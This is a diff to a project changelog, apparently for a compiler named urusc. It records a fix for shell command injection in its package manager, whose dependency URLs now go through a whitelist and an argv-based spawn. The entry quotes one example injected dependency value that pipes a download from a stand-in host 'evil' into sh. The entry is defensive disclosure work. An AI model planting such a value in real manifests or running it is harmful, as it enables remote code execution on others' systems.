@@ -29,6 +29,15 @@ the previous version numbers.
   definition and breaking the link. The generated file is now compiled
   through a single `OBJECT` library and linked into both `urusc` and
   `urusc-lsp`, so the generator runs exactly once.
+- **Security (pkg):** the package manager no longer passes dependency URLs
+  through a shell. `urusc pkg install` previously composed a `git clone`
+  invocation via `system("git clone ... %s %s", url, dest)`, which made a
+  malicious `urus.toml` a supply-chain RCE vector (e.g. a dependency
+  value of `https://x/r.git; curl evil | sh` would execute the trailing
+  command). The dependency value is now validated against a strict
+  URL/scp-spec whitelist and passed as an `argv` element to
+  `fork`/`execvp` (POSIX) or `_spawnvp` (Windows), with no shell in the
+  loop. Values that fail validation are rejected with a clear error.
 - (more entries will land here as the foundation PRs merge)
 
 ---
